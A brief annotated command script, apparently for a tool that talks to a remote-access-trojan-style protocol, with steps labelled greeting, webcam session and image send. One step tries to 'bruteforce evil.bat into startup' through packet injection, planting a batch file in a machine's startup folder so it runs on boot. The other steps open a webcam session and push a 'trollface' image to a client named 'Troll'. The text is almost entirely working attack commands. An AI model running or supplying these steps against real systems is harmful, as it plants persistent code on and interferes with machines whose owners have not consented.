## Greeting
INFO;Hello;Hello;Hello

## Attempt to bruteforce evil.bat into startup (it should be small so the trick doesn't take very long!)
@EVALL pv3.startup_bruteforce_filename('Please wait...', 'evil.bat', depth=20, inject_packet_between=lambda _,c: [x.Packet(b'FileManagerErr', c, b'Please wait...')])

## Init a webcam session (webcams = Troll, client ID = Troll)
WBCM;Troll|;Troll
## Send an image (the last argument is the client ID)
Cam;gz:trollface.jpg;Troll